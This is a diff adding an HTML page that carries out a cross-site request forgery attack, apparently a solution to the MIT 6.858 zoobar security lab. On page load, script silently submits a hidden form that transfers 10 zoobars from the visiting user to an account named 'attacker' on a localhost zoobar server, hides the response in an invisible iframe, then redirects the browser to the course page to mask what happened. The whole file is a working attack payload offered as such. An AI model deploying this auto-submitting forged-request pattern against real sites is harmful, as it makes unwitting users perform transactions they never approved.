@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Title of the document</title>
+<script>
+ window.onload = function() {
+   var button = document.querySelector('#submitButton');
+   button.click();
+   window.location = "http://css.csail.mit.edu/6.858/2014/";
+ }
+</script>
+</head>
+
+<body>
+  <div style="display:none;">
+    <form target="moi" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+      <p>Send <input name="zoobars" type="text" value="10" size="5"> zoobars</p>
+      <p>to <input name="recipient" type="text" value="attacker" size="10"></p>
+      <input type="submit" name="submission" value="Send" id="submitButton">
+    </form>
+  </div>
+  <iframe name="moi" style="visibility: hidden"><iframe>
+</body>
+
+</html>
